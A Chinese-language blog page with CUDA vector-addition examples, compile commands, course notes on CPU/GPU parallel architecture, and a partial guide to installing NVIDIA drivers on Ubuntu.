<h3 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a>示例代码：</h3><p>以下是一个简单的示例代码，展示了在CUDA中执行向量加法的基本步骤：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">vectorAddition</span><span class="params">(<span class="type">float</span>* a, <span class="type">float</span>* b, <span class="type">float</span>* result, <span class="type">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> idx = threadIdx.x + blockIdx.x * blockDim.x;</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; size) &#123;</span><br><span class="line">        result[idx] = a[idx] + b[idx];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> size = <span class="number">1024</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> blockSize = <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">float</span>* hostA = <span class="keyword">new</span> <span class="type">float</span>[size];</span><br><span class="line">    <span class="type">float</span>* hostB = <span class="keyword">new</span> <span class="type">float</span>[size];</span><br><span class="line">    <span class="type">float</span>* hostResult = <span class="keyword">new</span> <span class="type">float</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化输入数据...</span></span><br><span class="line"></span><br><span class="line">    <span class="type">float</span>* deviceA, *deviceB, *deviceResult;</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;deviceA, size * <span class="built_in">sizeof</span>(<span class="type">float</span>));</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;deviceB, size * <span class="built_in">sizeof</span>(<span class="type">float</span>));</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;deviceResult, size * <span class="built_in">sizeof</span>(<span class="type">float</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(deviceA, hostA, size * <span class="built_in">sizeof</span>(<span class="type">float</span>), cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(deviceB, hostB, size * <span class="built_in">sizeof</span>(<span class="type">float</span>), cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">    vectorAddition&lt;&lt;&lt;(size + blockSize - <span class="number">1</span>) / blockSize, blockSize&gt;&gt;&gt;(deviceA, deviceB, deviceResult, size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(hostResult, deviceResult, size * <span class="built_in">sizeof</span>(<span class="type">float</span>), cudaMemcpyDeviceToHost);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理结果...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] hostA;</span><br><span class="line">    <span class="keyword">delete</span>[] hostB;</span><br><span class="line">    <span class="keyword">delete</span>[] hostResult;</span><br><span class="line">    <span class="built_in">cudaFree</span>(deviceA);</span><br><span class="line">    <span class="built_in">cudaFree</span>(deviceB);</span><br><span class="line">    <span class="built_in">cudaFree</span>(deviceResult);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述示例演示了在GPU上使用CUDA执行向量加法的步骤。这只是一个简单的入门示例，实际情况中可能涉及更复杂的计算任务和数据管理。确保参考CUDA文档和示例以获取更多详细信息。</p>
<h2 id="C-cuda库-编译和链接"><a href="#C-cuda库-编译和链接" class="headerlink" title="C++ cuda库 编译和链接"></a>C++ cuda库 编译和链接</h2><p>编译和链接使用CUDA库的C++代码通常需要遵循以下步骤。以下示例假设你已经安装了NVIDIA的GPU驱动、CUDA工具包和相应版本的cuBLAS、cuFFT等库。</p>
<h3 id="编写CUDA-C-代码"><a href="#编写CUDA-C-代码" class="headerlink" title="编写CUDA C++代码"></a>编写CUDA C++代码</h3><p>首先，编写包含CUDA核函数的C++源代码。在CUDA C++代码中，通常使用<code>__global__</code>修饰符定义在GPU上执行的核函数。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vectorAdd.cu</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">vectorAddition</span><span class="params">(<span class="type">float</span>* a, <span class="type">float</span>* b, <span class="type">float</span>* result, <span class="type">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> idx = threadIdx.x + blockIdx.x * blockDim.x;</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; size) &#123;</span><br><span class="line">        result[idx] = a[idx] + b[idx];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> size = <span class="number">1024</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> blockSize = <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 与上述示例相同的主机代码 ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在主机上调用 CUDA 核函数</span></span><br><span class="line">    vectorAddition&lt;&lt;&lt;(size + blockSize - <span class="number">1</span>) / blockSize, blockSize&gt;&gt;&gt;(deviceA, deviceB, deviceResult, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 处理结果及释放内存 ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="编译CUDA-C-代码"><a href="#编译CUDA-C-代码" class="headerlink" title="编译CUDA C++代码"></a>编译CUDA C++代码</h3><p>使用<code>nvcc</code>命令来编译CUDA C++代码。<code>nvcc</code>是NVIDIA CUDA Compiler的命令行工具。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvcc -o your_executable vectorAdd.cu</span><br></pre></td></tr></table></figure>

<p>此命令将源文件<code>vectorAdd.cu</code>编译为可执行文件<code>your_executable</code>。<code>nvcc</code>会负责将CUDA核函数编译为GPU二进制代码，并链接CUDA运行时库。</p>
<h3 id="编译和链接其他C-文件"><a href="#编译和链接其他C-文件" class="headerlink" title="编译和链接其他C++文件"></a>编译和链接其他C++文件</h3><p>如果你的项目包含其他C++源文件，你可以使用常规的C++编译器（例如<code>g++</code>）来编译和链接这些文件。确保将CUDA头文件和库的路径包含到编译过程中，并链接相应的CUDA库。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -o your_executable your_main.cpp -I/path/to/cuda/include -L/path/to/cuda/lib -lcudart -lcublas -lculibos -lcufft</span><br></pre></td></tr></table></figure>

<p>在上述命令中，<code>/path/to/cuda/include</code>和<code>/path/to/cuda/lib</code>需要替换为你系统中实际的CUDA头文件和库文件的路径。</p>
<h3 id="运行可执行文件"><a href="#运行可执行文件" class="headerlink" title="运行可执行文件"></a>运行可执行文件</h3><p>最后，运行生成的可执行文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./your_executable</span><br></pre></td></tr></table></figure>

<p>请注意，确保CUDA库和头文件的路径正确设置，并且使用了正确的编译选项。在实际项目中，可能需要更详细的配置和管理依赖项。</p>
<h2 id="课程笔记"><a href="#课程笔记" class="headerlink" title="课程笔记"></a>课程笔记</h2><ul>
<li><p>超标量，Superschalar</p>
</li>
<li><p>指令调度，Scheduling</p>
</li>
<li><p>寄存器重命名，Register Renaming   </p>
</li>
<li><p>乱序执行，Out-of-Order(OoO)Execution</p>
<ul>
<li>重排指令，获得最大的吞吐率</li>
<li>重排缓冲区</li>
</ul>
</li>
<li><p>存储器架构&#x2F;层次，Memory Hierarchy</p>
<ul>
<li>存储器越大越慢</li>
<li>粗略的估计<ul>
<li>SRAM(L1, L2, L3)</li>
<li>DRAM(memory)</li>
<li>Flash(disk)</li>
<li>HDD(disk)</li>
</ul>
</li>
</ul>
</li>
<li><p>缓存,Caching</p>
<ul>
<li>将数据放在尽可能接近的位置</li>
<li>利用<ul>
<li>时间临近性，刚刚使用过的数据很可能会被再次使用</li>
<li>空间临近性，倾向于使用周围的临近的数据</li>
</ul>
</li>
<li>缓存层次，Cache Hierarchy<ul>
<li>硬件管理<ul>
<li>L1 Instruction&#x2F;Data caches</li>
<li>L2 unified cache</li>
<li>L3 unified cache</li>
</ul>
</li>
<li>软件管理<ul>
<li>Main memory</li>
<li>Disk</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>存储器的另外设计考虑</p>
<ul>
<li>分区Banking  –  避免多端口</li>
<li>一致性  Coherency</li>
<li>控制器  Memory Controller</li>
</ul>
</li>
<li><p>CPU内部的并行性</p>
<ul>
<li>指令级并行<ul>
<li>超标量</li>
<li>乱序执行</li>
</ul>
</li>
<li>数据级并行<ul>
<li>矢量计算</li>
</ul>
</li>
<li>线程级并行<ul>
<li>同步多线程</li>
<li>多核</li>
</ul>
</li>
</ul>
</li>
<li><p>向量运算,Vectors Motivation</p>
</li>
<li><p>数据级并行 Data&#x3D;level Parallelism</p>
<ul>
<li>单指令多数据 Single Instruction Multiple Data(SIMD)<ul>
<li>执行单元(ALU)很宽</li>
</ul>
</li>
</ul>
</li>
<li><p>线程级并行  Thread-Level-Parallelism</p>
</li>
<li><p>多核 Multicore</p>
<ul>
<li>将流水线完整复制</li>
</ul>
</li>
<li><p>锁存，一致性和同一性</p>
<ul>
<li>问题：多线程读写同一块数据<ul>
<li>解决办法：加锁</li>
</ul>
</li>
<li>问题：谁的数据是正确的？<ul>
<li>解决办法：缓存一致性协议Coherence</li>
</ul>
</li>
<li>问题：什么样的数据是正确的Consistency<ul>
<li>解决方法：存储器同一性模型</li>
</ul>
</li>
</ul>
</li>
<li><p>现实的困境：能量墙 Power Wall</p>
</li>
<li><p>新时代的计算计数：并行计算</p>
<ul>
<li>常规传统单核处理器遇到物理约束，时钟频率(perf&#x2F;clock)无法保持线性增长</li>
</ul>
</li>
<li><p>新摩尔定律</p>
<ul>
<li>处理器越来越胖</li>
<li>单核的性能不会大幅度提升</li>
</ul>
</li>
<li><p>另外一堵墙：存储器墙</p>
<ul>
<li>处理器的存储器带宽无法满足处理能力的提升</li>
</ul>
</li>
<li><p>结论</p>
<ul>
<li>CPU，为串行程序优化<ul>
<li>Pipelines, branch prediction, superscalaer, OoO</li>
<li>Reduce execution time with high clock speeds and high utilization</li>
</ul>
</li>
<li>缓慢的内存带宽(存储器带宽)将会是大问题</li>
<li>并行处理是方向</li>
</ul>
</li>
</ul>
<h2 id="并行技术的概述"><a href="#并行技术的概述" class="headerlink" title="并行技术的概述"></a>并行技术的概述</h2><ul>
<li><p>(数据)并行处理方法</p>
</li>
<li><p>串行计算模式</p>
<ul>
<li>常规软件是串行的<ul>
<li>设计运行于一个中央处理器上(CPU)</li>
<li>通过离散的指令序列完成一个问题的解决</li>
<li>一条一条指令的执行</li>
<li>同时只有一条指令在执行</li>
</ul>
</li>
</ul>
</li>
<li><p>并行计算模式</p>
<ul>
<li>一句话：并行计算是同时应用多个计算资源解决一个计算问题<ul>
<li>设计多个计算资源或处理器</li>
<li>问题被分解为多个离散的部分，可以同时处理(并行)</li>
<li>每个部分可以由一系列指令完成</li>
</ul>
</li>
<li>每个部分的指令在不同的处理器上执行</li>
</ul>
</li>
<li><p>概念和名词</p>
<ul>
<li>Flynn 矩阵， The matrix below defines the 4 possible classifications according to Flynn<ul>
<li>SISD, Single Instruction, Single Data</li>
<li>SIMD, Single Instruction, Multiple Data</li>
<li>MISD, Multiple Instruction, Single Data</li>
<li>MIMD, Multiple Instruction, Multiple Data</li>
</ul>
</li>
</ul>
</li>
<li><p>常见名词</p>
<ul>
<li>Task，任务  –  可以得到完整结果的一个过程，一个或多个代码段</li>
<li>Parallel Task , 并行任务</li>
<li>Serial Execution， 串行执行</li>
<li>Parallel Execution Execution，并行执行</li>
<li>Shared Memory，共享存储</li>
<li>Distributed Memory，分布式存储  –  存储的东西放在不同的地方</li>
<li>Communications，通信</li>
<li>Synchronization，同步  –  </li>
<li>Granularity，粒度  –  划分任务的大小</li>
<li>Observed Speedup，加速比  – 对比一个标志物，获得性能的提升</li>
<li>Parallel Overhead，并行开销  –  最主要是通讯的问题</li>
<li>Scalability，可扩展性  –</li>
</ul>
</li>
<li><p>存储器架构</p>
<ul>
<li>共享存储(Shared Memory)</li>
<li>分布式存储(Distributed Memory)</li>
<li>混合分布式-共享式存储(Hybrid Distributed-Shared Memory)</li>
</ul>
</li>
<li><p>并行编程模型</p>
<ul>
<li>共享存储模型(Shared Memory Model)</li>
<li>线程模型(Threads Model)</li>
<li>消息传递模型(Message Passing Model)</li>
<li>数据并行模型(Data Parallel Model)</li>
</ul>
</li>
<li><p>具体实例</p>
<ul>
<li>OpenMP</li>
<li>MPI</li>
<li>Single Program Multiple Data(SPMD)</li>
<li>Multiple Program Multiple Data(MPMD)</li>
</ul>
</li>
<li><p>设计并行处理程序和系统</p>
<ul>
<li>自动和手动并行</li>
<li>理解问题和程序</li>
<li>分块分割</li>
<li>通信<ul>
<li>broadcast，广播</li>
<li>scatter，发散</li>
<li>gather，汇集</li>
<li>reduction，整合</li>
</ul>
</li>
<li>同步</li>
<li>负载均衡  –  一核有难，七核围观 </li>
<li>粒度</li>
<li>I&#x2F;O</li>
<li>成本</li>
<li>性能分析和优化</li>
</ul>
</li>
<li><p>加速比：</p>
<ul>
<li>speedup &#x3D; 1&#x2F;(p&#x2F;N + S)<ul>
<li>P &#x3D; 并行部分</li>
<li>N &#x3D; 处理器数码</li>
<li>S &#x3D; 串行部分</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="搭建并行编程环境"><a href="#搭建并行编程环境" class="headerlink" title="搭建并行编程环境"></a>搭建并行编程环境</h2><ul>
<li><p>cuda zone</p>
</li>
<li><p>sample&#x2F;devicequery</p>
</li>
</ul>
<h3 id="五"><a href="#五" class="headerlink" title="五"></a>五</h3><ul>
<li><p>名词解释</p>
<ul>
<li>FLOPS  –  FLoating -point OPerations per Second</li>
<li>GFLOPS  –  One billion FLOPS</li>
<li>TFLOPS  –  1000 GFLOPS</li>
</ul>
</li>
<li><p>为什么需要GPU？</p>
<ul>
<li>应用的需求越来越高</li>
<li>计算机技术由应用推动</li>
</ul>
</li>
<li><p>GPU(Graphic Processing Unit),是一个异构的多处理器芯片，为图形图像处理优化</p>
</li>
<li><p>三种方法提升GPU的处理速度</p>
</li>
<li><p>GPU的存储器</p>
</li>
<li><p>停滞</p>
<ul>
<li>大量的独立片元相互切换</li>
<li>通过片元切换掩藏延迟</li>
</ul>
</li>
<li><p>上下文存储空间, Storing contexts</p>
<ul>
<li>上下文存储池</li>
</ul>
</li>
<li><p>上下文呢也可以软件也可以硬件管理</p>
</li>
<li><p>如果只是一个ALU，只能称为一个计算单元，</p>
</li>
<li><p>ALU＋存储，是一个计算核心，简称核</p>
</li>
<li><p>Fermi架构细节</p>
<ul>
<li>480 stream processors(“CUDA cores”)<ul>
<li>一个stream processor，流处理器，理解上可以等同为一个ALU，计算单元</li>
</ul>
</li>
</ul>
</li>
<li><p>存储和数据访问 –  访存</p>
<ul>
<li>Recall:”CPU-style” core<ul>
<li>memory hierarchy, 多级缓存</li>
</ul>
</li>
<li>GPU型的吞吐处理核<ul>
<li>将存储器放在了外面</li>
</ul>
</li>
</ul>
</li>
<li><p>访存带宽，是非常宝贵的资源</p>
</li>
<li><p>带宽测试  –  </p>
</li>
<li><p>带宽受限</p>
<ul>
<li>减少带宽需求</li>
</ul>
</li>
<li><p>GPU，是异构 众核 处理器，针对吞吐优化</p>
</li>
<li><p>高效的GPU任务具备的条件</p>
<ul>
<li>具有成千上万的独立工作<ul>
<li>尽量利用大量的ALU单元</li>
<li>大量的片元切换掩藏延迟</li>
</ul>
</li>
<li>可以共享指令流<ul>
<li>适用于SIMD处理</li>
</ul>
</li>
<li>最好是计算密集的任务<ul>
<li>通信和计算开销比例合适</li>
<li>不要受制于访问带宽</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="六"><a href="#六" class="headerlink" title="六"></a>六</h3><ul>
<li><p>CPU-GPU交互</p>
<ul>
<li>各自的物理内存空间</li>
<li>通过PCIE总线互连</li>
<li>交互开销较大</li>
</ul>
</li>
<li><p>访存速度</p>
<ul>
<li>Register</li>
<li>Shared Memory</li>
<li>Local Memory</li>
<li>Global Memory</li>
<li>Constant Memory</li>
<li>Texture Memory</li>
<li>Instruction Memory</li>
</ul>
</li>
<li><p>线程组织架构说明</p>
<ul>
<li>一个Kernel具有大量线程</li>
<li>线程被划分成线程块 blocks</li>
<li>Kernel启动一个grid，包含若干线程块</li>
<li>线程和线程块具有唯一的标识</li>
</ul>
</li>
<li><p>编程模型：</p>
<ul>
<li>常规意义的GPU用于处理图形图像</li>
<li>操作于像素，每个像素的操作都类似</li>
<li>可以应用SIMD，也可以认为是数据并行分割</li>
</ul>
</li>
<li><p>CUDA编程模式：Extended C              </p>
</li>
<li><p>CUDA函数声明</p>
<ul>
<li>__global__定义一个kernel函数：入口函数，CPU上调用，GPU上执行，必须返回void</li>
</ul>
</li>
</ul>
<h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><ul>
<li><p>2007 – NVIDIA发布CUDA</p>
<ul>
<li>CUDA  –  全称 Compute Uniform Device  Architecture，统一计算设备架构</li>
</ul>
</li>
<li><p>CUDA术语</p>
<ul>
<li>Host  –  即主机端，通常指CPU。采用ANSI标准C语言编程</li>
<li>Device –  即设备端，通常指GPU（数据可并行）。采用ANSI 标准C的扩展语言编程</li>
<li>Host和Device拥有各自的存储器</li>
<li>CUDA编程：包括主机端和设备端两部分代码</li>
<li>Kernel  –  数据并行处理函数。通过调用kernel函数在设备端创建轻量级线程，线程由硬件负责创建并进行管理</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/NVIDIA/CUDA/2024-05-22-nvidia_1_%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/NVIDIA/CUDA/2024-05-22-nvidia_1_%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">nvidia_1_理论基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/NVIDIA/" itemprop="url" rel="index"><span itemprop="name">NVIDIA</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>NVIDIA 相关理论基础知识</li>
</ul>
<h2 id="NVIDIA-驱动卸载"><a href="#NVIDIA-驱动卸载" class="headerlink" title="NVIDIA 驱动卸载"></a>NVIDIA 驱动卸载</h2><ul>
<li>运行命令：<ul>
<li><code>sudo apt-get autoremove --purge nvidia-*</code></li>
</ul>
</li>
</ul>
<h2 id="最新驱动安装"><a href="#最新驱动安装" class="headerlink" title="最新驱动安装"></a>最新驱动安装</h2><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><ul>
<li>安装驱动之前，必须要更新软件列表和安装依赖<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update      <span class="comment">#更新软件列表</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install g++</span><br><span class="line"><span class="built_in">sudo</span> apt-get install gcc</span><br><span class="line"><span class="built_in">sudo</span> apt-get install make</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="禁用nouveau"><a href="#禁用nouveau" class="headerlink" title="禁用nouveau"></a>禁用nouveau</h3><ul>
<li><p>nouveau是Ubuntu自带的显卡驱动，但他是核显，我这里想安装独显，就得把他禁掉。</p>
</li>
<li><p>创建文件，如果没有下载vim编辑器，将vim换成gedit即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> vim /etc/modprobe.d/blacklist-nouveau.conf</span><br></pre></td></tr></table></figure>
</li>
<li><p>在文件中插入以下内容，将nouveau加入黑名单，默认不开启</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset=0</span><br></pre></td></tr></table></figure>
</li>
<li><p>输入以下命令使禁用生效然后重启</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> update-initramfs -u   <span class="comment">#更新系统</span></span><br><span class="line"><span class="built_in">sudo</span> reboot</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启后验证</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsmod | grep nouveau</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果回车后无反应，则禁用成功</p>
</li>
</ul>
<h3 id="先完全卸载之前的显卡驱动"><a href="#先完全卸载之前的显卡驱动" class="headerlink" title="先完全卸载之前的显卡驱动"></a>先完全卸载之前的显卡驱动</h3><ul>
<li><p>ppa源文件卸载（方式一）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> apt-get remove --purge nvidia*</span><br></pre></td></tr></table></figure>
</li>
<li><p>runfile源文件卸载（方式二）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ./NVIDIA-Linux-x86_64-384.59.run --uninstall</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h3><ul>
<li><p>查询电脑最适合的显卡驱动版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu-drivers devices</span><br></pre></td></tr></table></figure>
</li>
<li><p>随后用命令行进行安装</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> add-apt-repository ppa:graphics-drivers/ppa</span><br><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"><span class="built_in">sudo</span> apt-get install nvidia-driver-525 <span class="comment">#此处数字要对应上面查询到的版本号</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install mesa-common-dev</span><br></pre></td></tr></table></figure>
</li>
<li><p>注意： 如果前面没有禁用secure boot，则在安装过程中会提示设置一个密码，在重启时需要输入密码验证以禁用secure boot，重启后会出现蓝屏，这时候不能直接选择continue,而应该按下按键，选择Enroll MOK, 确认后在下一个选项中选择continue,接着输入安装驱动时设置的密码，开机。</p>
</li>
<li><p>安装完成后重启</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> reboot</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启后在终端验证</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="NVIDIA-驱动安装"><a href="#NVIDIA-驱动安装" class="headerlink" title="NVIDIA 驱动安装"></a>NVIDIA 驱动安装</h2><ul>
<li><p>Ubuntu下安装NVIDIA驱动的三种方法：</p>
<ul>
<li>使用标准Ubuntu仓库进行自动安装</li>
<li>使用PPA仓库进行自动化安装</li>
<li>使用官方的NVIDIA驱动进行手动安装</li>
</ul>
</li>
<li><p>第一种方法操作最为简单，方便，第三种方法是最稳定，最常用的。</p>
</li>
<li><p>使用标准Ubuntu 仓库进行自动安装</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ubuntu-drivers devices</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> ubuntu-drivers autoinstall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 完成后重启 就可完成安装NVIDIA驱动</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用PPA仓库进行自动安装</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> add-apt-repository ppa:graphics-drivers/ppa      //添加ppa库到系统中</span><br><span class="line"><span class="built_in">sudo</span> apt update         //  更新</span><br><span class="line"> </span><br><span class="line"><span class="built_in">sudo</span> ubuntu-drivers devices // 显示可以安装的nvidia驱动</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> apt install nvidia-xxx        //  xxx  代表你想安装的nVidia驱动的版本号</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用官方的NVIDIA驱动进行手动安装</p>
<ul>
<li>先要搞清楚你的nvidia显卡是什么什么型号<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lshw -numeric -C display</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">lspci -vnn | grep VGA  // 查看nvidia显卡型号</span><br></pre></td></tr></table></figure></li>
<li>然后到NVIDIA官网下载对应你显卡型号的最新版本驱动进行下载  保存到你自己的路径文件夹</li>
